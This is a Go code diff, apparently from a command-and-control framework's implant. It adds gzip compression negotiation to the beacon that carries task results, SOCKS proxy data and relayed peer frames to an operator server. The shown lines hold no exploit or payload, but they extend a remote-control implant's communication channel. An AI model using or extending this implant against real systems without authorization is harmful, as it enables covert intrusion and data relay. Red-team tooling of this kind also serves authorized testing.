@@ -9,6 +9,8 @@ import (
 	"strings"
 	"sync/atomic"
 	"time"
+
+	"github.com/forgec2/forgec2/pkg/protocol"
 )
 
 // requeuePendingBeacon puts results/acks that did not reach the server back in
@@ -140,16 +142,25 @@ func doBeacon() {
 		ProtocolVersion: CurrentProtocolVersion,
 		AgentVersion:    AgentVersion,
 		Info:            info,
-		Results:         resultsCopy,
-		AckTaskIDs:      acksCopy,
-		TaskCapacity:    &taskCapacity,
-		SocksData:       socksData,
-		Relayed:         relayedResults,
-		RelayedFrames:   p2pDrainChildFrames(),
-		DroppedResults:  int(takeDroppedResultsCount()),
+		// Advertise that this implant can inflate gzip plaintexts. The peer
+		// only compresses after seeing this, so old servers keep sending plain.
+		Compression:    "gzip",
+		Results:        resultsCopy,
+		AckTaskIDs:     acksCopy,
+		TaskCapacity:   &taskCapacity,
+		SocksData:      socksData,
+		Relayed:        relayedResults,
+		RelayedFrames:  p2pDrainChildFrames(),
+		DroppedResults: int(takeDroppedResultsCount()),
 	}
 
 	body, _ := json.Marshal(req)
+	// Once the server has advertised that it can inflate, compress the
+	// plaintext BEFORE AEAD (ciphertext itself is incompressible). The gzip
+	// prefix lives inside the authenticated ciphertext, so it cannot be forged.
+	if compressed, used := protocol.CompressBeacon(body, peerCanInflate.Load()); used {
+		body = compressed
+	}
 
 	// Decide frame type and build the v2 envelope. Encryption failures MUST NOT
 	// fall back to plaintext (defeats encryption / leaks beacon data); drop the
@@ -390,6 +401,15 @@ func doBeacon() {
 			inFastMode.Store(true)
 			return
 		}
+		plaintext, err = protocol.DecompressBeacon(plaintext)
+		if err != nil {
+			if Debug {
+				log.Printf("[!] beacon response decompression failed: %v", err)
+			}
+			noteBeaconFailure(resultsInFrame, resultsCopy, acksCopy)
+			inFastMode.Store(true)
+			return
+		}
 		if err := decodeBeacon(plaintext, &resp); err != nil {
 			if Debug {
 				log.Printf("[!] Failed to decode beacon response: %v", err)
@@ -399,6 +419,10 @@ func doBeacon() {
 			inFastMode.Store(true)
 			return
 		}
+		// Learn whether the server can inflate our compressed plaintexts. It
+		// advertises this inside the AEAD-authenticated response, so a MITM
+		// cannot turn compression on by rewriting a cleartext field.
+		peerCanInflate.Store(resp.Compression == "gzip")
 		// Online config refresh: an encrypted response may carry the operator's
 		// live network config (changed or periodic). It is secret-bound and the
 		// enclosing frame is AEAD-authenticated, so applying it is safe. This
